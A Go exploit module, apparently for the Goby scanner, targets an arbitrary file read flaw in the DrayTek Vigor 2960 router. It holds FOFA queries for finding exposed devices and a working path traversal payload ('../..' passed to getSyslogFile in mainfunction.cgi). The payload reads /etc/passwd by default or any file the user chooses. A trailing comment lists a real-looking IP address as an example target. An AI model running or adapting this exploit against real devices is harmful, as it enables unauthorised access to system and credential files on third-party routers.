package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Draytek Vigor 2960 File Read Vulnerability",
    "Description": "<p>Vigor2960 is a dual-WAN broadband router/VPN gateway.</p><p>Vigor2960 v1.5.1.4 has arbitrary file read vulnerability.</p>",
    "Product": "DrayTek-Vigor2960",
    "Homepage": "https://www.draytek.com/",
    "DisclosureDate": "2023-02-25",
    "Author": "sunying",
    "FofaQuery": "banner=\"Model: Vigor2960\" || body=\"src=\\\"V2960/excanvas.js\" || title==\"Vigor 2960\" || body=\"src=\\\"V2960/V2960.nocache.js\\\">\"",
    "GobyQuery": "banner=\"Model: Vigor2960\" || body=\"src=\\\"V2960/excanvas.js\" || title==\"Vigor 2960\" || body=\"src=\\\"V2960/V2960.nocache.js\\\">\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:</p><p><a href=\"https://www.draytek.com/\">https://www.draytek.com/</a></p>",
    "References": [
        "https://github.com/xxy1126/Vuln/blob/main/Draytek/3.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Draytek Vigor 2960 网关文件读取漏洞",
            "Product": "DrayTek-Vigor2960",
            "Description": "<p>Vigor2960 是一款双 WAN 宽带路由器 VPN 网关。</p><p>Vigor2960 v1.5.1.4 存在任意文件读取漏洞。攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：</p><p><a href=\"https://www.draytek.com/\">https://www.draytek.com/</a></p>",
            "Impact": "<p>Vigor2960 v1.5.1.4 存在任意文件读取漏洞。攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Draytek Vigor 2960 File Read Vulnerability",
            "Product": "DrayTek-Vigor2960",
            "Description": "<p>Vigor2960 is a dual-WAN broadband router/VPN gateway.<br></p><p>Vigor2960&nbsp;v1.5.1.4 has arbitrary file read vulnerability.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<br></p><p><a href=\"https://www.draytek.com/\">https://www.draytek.com/</a></p>",
            "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10818"
}`
	sendPayloada3EHa := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/cgi-bin/mainfunction.cgi")
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = "action=getSyslogFile&option=../.." + filename
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayloada3EHa(u, "/etc/passwd")
			if err != nil || rsp.StatusCode != 200 {
				return false
			}
			return strings.Contains(rsp.Utf8Html, "root:") && strings.Contains(rsp.Utf8Html, ":0:r")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := goutils.B2S(ss.Params["filePath"])
			rsp, err := sendPayloada3EHa(expResult.HostInfo, filePath)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else {
				expResult.Success = true
				expResult.Output = rsp.Utf8Html
			}
			return expResult
		},
	))
}

/* 案例
60.250.137.55
*/
